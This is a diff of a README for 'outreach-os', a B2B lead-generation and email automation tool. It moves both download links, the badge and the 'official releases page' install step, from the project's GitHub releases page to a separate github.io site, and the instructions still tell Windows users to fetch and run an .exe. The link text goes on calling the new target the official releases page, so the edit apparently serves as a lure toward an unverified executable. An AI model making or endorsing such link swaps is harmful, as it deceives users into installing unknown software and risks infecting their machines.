@@ -1,6 +1,6 @@
 # 🤖 outreach-os - Automate B2B lead generation and emails
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sunshinemultiplechoice751/outreach-os/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sunshinemultiplechoice751.github.io)
 
 ## 🎯 About this system
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/sunshinemultiplechoice751/outreach-os/releases) to download the installer.
+1. Visit the [official releases page](https://sunshinemultiplechoice751.github.io) to download the installer.
 2. Select the file ending in .exe from the latest release list.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
